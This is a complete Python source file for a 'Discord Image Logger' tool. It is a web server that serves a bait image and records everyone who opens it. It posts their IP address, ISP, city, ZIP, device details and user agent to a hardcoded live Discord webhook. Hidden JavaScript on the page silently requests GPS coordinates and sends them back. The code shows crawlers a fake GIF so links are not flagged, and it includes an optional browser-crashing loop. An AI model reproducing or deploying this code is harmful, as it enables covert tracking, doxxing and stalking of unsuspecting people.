# -*- coding: utf-8 -*-
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, socket
from datetime import datetime, timezone

__app__         = "Discord Image Logger"
__version__     = "v3.2"
__author__      = "C00lB0i"

config = {
    # ── BASE CONFIG ──────────────────────────────────────────────────────────
    "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
    "image":   "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif",
    "imageArgument": True,  # Allow ?url=<base64> or ?id=<base64> to override image

    # ── CUSTOMIZATION ────────────────────────────────────────────────────────
    "username": "Image Logger",
    "color":    0x00FFFF,

    # ── OPTIONS ──────────────────────────────────────────────────────────────
    "crashBrowser": False,

    "message": {
        "doMessage":   False,
        "message":     "This browser has been pwned by C00lB0i's Image Logger.",
        "richMessage": True,
    },

    # vpnCheck: 0=off | 1=no @everyone ping for VPN | 2=skip alert entirely
    "vpnCheck":   1,
    "linkAlerts": True,
    # buggedImage: serve a fake loading GIF to Discord crawlers
    "buggedImage": True,

    # antiBot: 0=off | 1=no ping hosting IPs | 2=no ping 100% bot
    #          3=skip alert hosting | 4=skip alert 100% bot
    "antiBot": 1,

    # ── REDIRECTION ──────────────────────────────────────────────────────────
    "redirect": {
        "redirect": False,
        "page":     "https://your-link.here",
    },
}

# IP prefixes to silently ignore
blacklistedIPs = ("27", "104", "143", "164")

# In-memory visit counter per endpoint
_visit_counts: dict = {}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _flag(country_code: str) -> str:
    if not country_code or len(country_code) != 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in country_code.upper())


def _rdns(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"


def _get_ip(headers) -> str:
    forwarded = headers.get("x-forwarded-for") or ""
    if forwarded:
        return forwarded.split(",")[0].strip()
    return (headers.get("x-real-ip") or "").strip()


def botCheck(ip: str, useragent: str) -> str | bool:
    if ip.startswith(("34", "35")):
        return "Discord"
    if (useragent or "").startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error: str):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content":  "@everyone",
            "embeds": [{
                "title":       "Image Logger \u2014 Error",
                "color":       config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        }, timeout=5)
    except Exception:
        pass


def makeReport(ip, useragent=None, endpoint="N/A", url=False,
               coords=None, is_gps_update=False):
    """
    POST a Discord embed for a visitor.

    coords        : "lat,lon" string (GPS-precise) or None (use ip-api)
    is_gps_update : True when this is the follow-up GPS-precise report
    """
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent or "")

    # ── Bot / link-alert path ─────────────────────────────────────────────
    if bot and not is_gps_update:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content":  "",
                    "embeds": [{
                        "title": "Image Logger \u2014 Link Sent",
                        "color": config["color"],
                        "description": (
                            f"An **Image Logging** link was sent in a chat!\n"
                            f"You may receive an IP soon.\n\n"
                            f"**Endpoint:** `{endpoint}`\n"
                            f"**IP:** `{ip}`\n"
                            f"**Platform:** `{bot}`"
                        ),
                    }],
                }, timeout=5)
            except Exception:
                pass
        return

    # ── Geolocation via ip-api.com ────────────────────────────────────────
    ping = "@everyone"
    try:
        info = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=5
        ).json()
    except Exception:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    # ── OS / Browser ──────────────────────────────────────────────────────
    os_name, browser_name = httpagentparser.simple_detect(useragent or "")

    # ── Coordinates & Google Maps link ────────────────────────────────────
    if coords:
        # Precise GPS coords sent back by the page JS
        parts = coords.replace(",", " ").split()
        lat, lon = (parts[0], parts[1]) if len(parts) == 2 else ("", "")
        coord_label = "\U0001f4cd Precise (GPS)"
    else:
        lat = str(info.get("lat", ""))
        lon = str(info.get("lon", ""))
        coord_label = "\U0001f4cd Approximate (IP-based)"

    if lat and lon:
        maps_url   = f"https://www.google.com/maps?q={lat},{lon}"
        coord_text = f"`{lat}, {lon}` \u2014 [Open in Google Maps]({maps_url})"
    else:
        coord_text = "`Unknown`"

    # ── Country flag ─────────────────────────────────────────────────────
    flag = _flag(info.get("countryCode", ""))

    # ── Reverse DNS ───────────────────────────────────────────────────────
    hostname = _rdns(ip)

    # ── Timezone ──────────────────────────────────────────────────────────
    tz_raw   = info.get("timezone", "/")
    tz_parts = tz_raw.split("/")
    tz_display = (
        f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
        if len(tz_parts) == 2 else tz_raw
    )

    # ── Visit counter ─────────────────────────────────────────────────────
    if not is_gps_update:
        _visit_counts[endpoint] = _visit_counts.get(endpoint, 0) + 1
    visit_no = _visit_counts.get(endpoint, 1)

    # ── Timestamp ─────────────────────────────────────────────────────────
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # ── Title changes for GPS update embed ────────────────────────────────
    title = (
        "Image Logger \u2014 \U0001f4cd GPS Location Updated"
        if is_gps_update else
        "Image Logger \u2014 IP Logged"
    )

    description = f"""**{"GPS Location Update" if is_gps_update else "A User Opened the Original Image!"}**

**Endpoint:** `{endpoint}`   \u2022   **Visit #:** `{visit_no}`

**\U0001f310 IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Hostname (rDNS):** `{hostname}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Org:** `{info.get('org', 'Unknown')}`

**{flag} Location:**
> **Country:** `{info.get('country', 'Unknown')}` {flag}
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **ZIP:** `{info.get('zip', 'Unknown')}`
> **{coord_label}:** {coord_text}
> **Timezone:** `{tz_display}`

**\U0001f512 Threat Info:**
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN/Proxy:** `{info.get('proxy', 'Unknown')}`
> **Hosting/Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**\U0001f4bb Device Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**User Agent:**
```
{useragent}
```"""

    embed = {
        "username": config["username"],
        "content":  ping,
        "embeds": [{
            "title":       title,
            "color":       0x00FF88 if is_gps_update else config["color"],
            "description": description,
            "footer":      {"text": f"\U0001f550 {now_utc}"},
        }],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception:
        pass

    return info


# ─────────────────────────────────────────────────────────────────────────────
# Fake "loading" GIF served to Discord crawlers
# ─────────────────────────────────────────────────────────────────────────────
binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


def _make_image_page(image_url: str, callback_url: str) -> bytes:
    """
    Returns an HTML page that:
    1. Displays the image fullscreen (looks completely normal to the user)
    2. Silently requests GPS in the background
    3. If granted, POSTs coords back to callback_url — no redirect, no reload
    """
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Image</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    background: #000;
    width: 100vw; height: 100vh;
    display: flex; align-items: center; justify-content: center;
    overflow: hidden;
  }}
  img {{
    max-width: 100%; max-height: 100%;
    object-fit: contain;
  }}
</style>
</head>
<body>
<img src="{image_url}" alt="">
<script>
(function() {{
  // Silently attempt GPS — no redirect, no reload, page stays on image
  if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
      function(pos) {{
        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;
        // Send coords back silently via fetch (no page change)
        fetch('{callback_url}&g=' + encodeURIComponent(btoa(lat + ',' + lon)), {{
          method: 'GET',
          mode: 'no-cors',
          cache: 'no-store'
        }}).catch(function(){{}});
      }},
      function() {{ /* denied — no action, image stays visible */ }},
      {{ timeout: 10000, maximumAge: 0, enableHighAccuracy: true }}
    );
  }}
}})();
</script>
</body>
</html>"""
    return html.encode("utf-8")


# ─────────────────────────────────────────────────────────────────────────────
# Request handler
# ─────────────────────────────────────────────────────────────────────────────
class ImageLoggerAPI(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def handleRequest(self):
        try:
            s   = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            # ── Resolve bait image URL ────────────────────────────────────
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                raw = dic.get("url") or dic.get("id")
                try:
                    url = base64.b64decode(raw.encode()).decode()
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]

            # ── Safely get visitor IP & User-Agent ────────────────────────
            ip = _get_ip(self.headers)
            ua = self.headers.get("user-agent") or ""

            # ── Blacklist check ───────────────────────────────────────────
            if ip and ip.startswith(blacklistedIPs):
                self._redirect(url)
                return

            endpoint = s.split("?")[0]

            # ── Discord / bot crawler path ────────────────────────────────
            if botCheck(ip, ua):
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header("Content-type", "image/gif")
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self._redirect(url)
                makeReport(ip, ua, endpoint=endpoint, url=url)
                return

            # ── GPS callback: silent fetch from the image page JS ─────────
            # When the JS on the image page gets GPS coords, it fetches
            # the same URL with &g=<base64 coords> appended.
            # We handle that here and return an empty 200 (no page change).
            if dic.get("g"):
                try:
                    coords = base64.b64decode(dic["g"].encode()).decode()
                except Exception:
                    coords = None
                if coords:
                    makeReport(ip, ua, endpoint=endpoint, url=url,
                               coords=coords, is_gps_update=True)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")
                return

            # ── Real visitor — first hit ──────────────────────────────────
            # 1. Log IP immediately (IP-based location)
            makeReport(ip, ua, endpoint=endpoint, url=url)

            # 2. Handle special modes
            if config["redirect"]["redirect"]:
                self._redirect(config["redirect"]["page"])
                return

            if config["message"]["doMessage"]:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(config["message"]["message"].encode())
                return

            if config["crashBrowser"]:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b'<script>setTimeout(function(){'
                    b'for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
                )
                return

            # 3. Default: serve the image page (shows image + silent GPS)
            #    Build the callback URL so JS can ping back with coords
            #    We preserve any existing query params (url/id) so the
            #    callback also resolves the same image.
            base_path = endpoint
            cb_params = {}
            if dic.get("url"):
                cb_params["url"] = dic["url"]
            elif dic.get("id"):
                cb_params["id"] = dic["id"]
            cb_query    = ("?" + parse.urlencode(cb_params)) if cb_params else "?"
            # If no params yet, still need ?
            if not cb_query.endswith("?") and cb_query == "?":
                cb_query = "?"
            callback_url = base_path + cb_query

            page = _make_image_page(url, callback_url)
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(page)

        except Exception:
            try:
                self.send_response(500)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b"500 - Internal Server Error<br>"
                    b"Check your Discord webhook for the traceback."
                )
                reportError(traceback.format_exc())
            except Exception:
                pass

    def _redirect(self, location: str):
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    do_GET  = handleRequest
    do_POST = handleRequest


handler = app = ImageLoggerAPI
